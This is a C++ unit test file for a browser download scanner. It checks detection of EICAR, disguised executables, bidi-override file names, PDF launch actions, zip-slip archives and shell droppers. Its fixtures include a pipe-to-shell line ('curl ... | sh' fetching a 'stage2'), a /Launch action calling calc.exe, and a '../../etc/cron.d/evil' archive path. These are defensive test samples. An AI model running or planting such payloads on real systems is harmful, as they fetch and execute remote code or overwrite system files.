// test_file_scanner.cc - built-in download scanner

#include "test_framework.h"

#include <string>
#include <vector>

#include "security/file_scanner.h"

using namespace lethe;

namespace {

std::string machOHeader() {
    // 64-bit little-endian Mach-O magic followed by plausible header bytes.
    return std::string("\xcf\xfa\xed\xfe\x0c\x00\x00\x01", 8) + std::string(64, '\0');
}

std::string zipWithEntry(const std::string& entryName, uint32_t compressed,
                         uint32_t uncompressed, bool encrypted) {
    std::string out;
    auto put16 = [&out](uint16_t v) {
        out.push_back(static_cast<char>(v & 0xff));
        out.push_back(static_cast<char>((v >> 8) & 0xff));
    };
    auto put32 = [&out](uint32_t v) {
        for (int i = 0; i < 4; ++i) out.push_back(static_cast<char>((v >> (8 * i)) & 0xff));
    };
    out += "PK\x03\x04";
    put16(20);                                   // version needed
    put16(encrypted ? 0x0001 : 0x0000);          // flags
    put16(8);                                    // method: deflate
    put16(0); put16(0);                          // time, date
    put32(0);                                    // crc
    put32(compressed);
    put32(uncompressed);
    put16(static_cast<uint16_t>(entryName.size()));
    put16(0);                                    // extra length
    out += entryName;
    out.append(compressed, 'x');                 // stand-in payload
    return out;
}

const char* kEicar =
    "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

bool hasFinding(const ThreatReport& report, const std::string& id) {
    for (const ThreatFinding& finding : report.findings)
        if (finding.id == id) return true;
    return false;
}

}  // namespace

LETHE_TEST_CASE(FileScanner_IdentifiesFormatsByMagicNotExtension) {
    const std::string macho = machOHeader();
    const ContentIdentity identity = identifyContent(macho.data(), macho.size());
    CHECK(identity.executable);
    CHECK_EQ(identity.label, std::string("Mach-O executable"));

    const std::string pdf = "%PDF-1.7\n1 0 obj\n";
    CHECK_EQ(identifyContent(pdf.data(), pdf.size()).label, std::string("PDF document"));

    const std::string html = "<!DOCTYPE html><html><body>hi</body></html>";
    CHECK_EQ(identifyContent(html.data(), html.size()).contentClass, ContentClass::Html);
}

LETHE_TEST_CASE(FileScanner_FlagsEicarAsMalicious) {
    const std::string data(kEicar);
    const ThreatReport report =
        scanDownloadBuffer("test.txt", "https://example.com/test.txt",
                           data.data(), data.size());
    CHECK_EQ(report.severity, ThreatSeverity::Malicious);
    CHECK(report.blocked());
}

LETHE_TEST_CASE(FileScanner_FlagsExecutableNamedAsDocument) {
    const std::string macho = machOHeader();
    const ThreatReport report =
        scanDownloadBuffer("invoice.pdf", "https://example.com/invoice.pdf",
                           macho.data(), macho.size());
    CHECK(hasFinding(report, "file.type_mismatch"));
    CHECK(report.blocked());
}

LETHE_TEST_CASE(FileScanner_FlagsDoubleExtension) {
    const std::string macho = machOHeader();
    const ThreatReport report =
        scanDownloadBuffer("statement.pdf.command", "https://example.com/x",
                           macho.data(), macho.size());
    CHECK(hasFinding(report, "file.double_extension"));
}

LETHE_TEST_CASE(FileScanner_FlagsBidiOverrideFilename) {
    // "report‮gnp.exe" renders as "reportexe.png".
    const std::string name = std::string("report") + "\xE2\x80\xAE" + "gnp.exe";
    const std::string text = "harmless text file body";
    const ThreatReport report =
        scanDownloadBuffer(name, "https://example.com/x", text.data(), text.size());
    CHECK(hasFinding(report, "file.bidi_filename"));
    CHECK(report.blocked());
}

LETHE_TEST_CASE(FileScanner_FlagsExecutableOverPlainHttp) {
    const std::string macho = machOHeader();
    const ThreatReport report =
        scanDownloadBuffer("tool", "http://downloads.example.com/tool",
                           macho.data(), macho.size());
    CHECK(hasFinding(report, "file.insecure_origin"));
}

LETHE_TEST_CASE(FileScanner_DetectsShellDropperScript) {
    const std::string script =
        "#!/bin/sh\n"
        "curl -fsSL https://example.com/stage2 | sh\n"
        "chmod +x /tmp/payload\n";
    const ThreatReport report =
        scanDownloadBuffer("install.sh", "https://example.com/install.sh",
                           script.data(), script.size());
    CHECK(hasFinding(report, "sig.pipe_to_shell"));
    CHECK(static_cast<int>(report.severity) >= static_cast<int>(ThreatSeverity::Suspicious));
}

LETHE_TEST_CASE(FileScanner_DetectsPdfLaunchAction) {
    const std::string pdf =
        "%PDF-1.4\n<< /OpenAction << /S /Launch /F (calc.exe) >> >>\ntrailer\n";
    const ThreatReport report =
        scanDownloadBuffer("doc.pdf", "https://example.com/doc.pdf",
                           pdf.data(), pdf.size());
    CHECK(hasFinding(report, "sig.pdf_launch"));
    CHECK(report.blocked());
}

LETHE_TEST_CASE(FileScanner_DetectsZipSlipEntry) {
    const std::string zip = zipWithEntry("../../etc/cron.d/evil", 16, 16, false);
    const ThreatReport report =
        scanDownloadBuffer("update.zip", "https://example.com/update.zip",
                           zip.data(), zip.size());
    CHECK(hasFinding(report, "archive.path_traversal"));
}

LETHE_TEST_CASE(FileScanner_DetectsEncryptedArchive) {
    const std::string zip = zipWithEntry("payload.bin", 32, 32, true);
    const ThreatReport report =
        scanDownloadBuffer("secret.zip", "https://example.com/secret.zip",
                           zip.data(), zip.size());
    CHECK(hasFinding(report, "archive.encrypted"));
}

LETHE_TEST_CASE(FileScanner_DetectsExecutableInsideArchive) {
    const std::string zip = zipWithEntry("setup.exe", 8, 8, false);
    const ThreatReport report =
        scanDownloadBuffer("bundle.zip", "https://example.com/bundle.zip",
                           zip.data(), zip.size());
    CHECK(hasFinding(report, "archive.contains_executable"));
}

LETHE_TEST_CASE(FileScanner_LeavesOrdinaryDownloadsAlone) {
    const std::string png = std::string("\x89PNG\r\n\x1a\n", 8) + std::string(512, '\x10');
    const ThreatReport report =
        scanDownloadBuffer("photo.png", "https://example.com/photo.png",
                           png.data(), png.size());
    CHECK(report.clean());
    CHECK_FALSE(report.blocked());

    const std::string text = "Dear team,\n\nThe quarterly numbers are attached.\n";
    const ThreatReport note =
        scanDownloadBuffer("note.txt", "https://example.com/note.txt",
                           text.data(), text.size());
    CHECK(note.clean());
}

LETHE_TEST_CASE(FileScanner_EntropyDiscriminatesTextFromRandom) {
    const std::string text(8192, 'a');
    CHECK_LT(shannonEntropy(text.data(), text.size()), 1.0);

    std::string random;
    random.reserve(8192);
    uint32_t state = 0x12345678u;
    for (int i = 0; i < 8192; ++i) {
        state = state * 1664525u + 1013904223u;
        random.push_back(static_cast<char>((state >> 24) & 0xff));
    }
    CHECK_GE(shannonEntropy(random.data(), random.size()), 7.5);
}
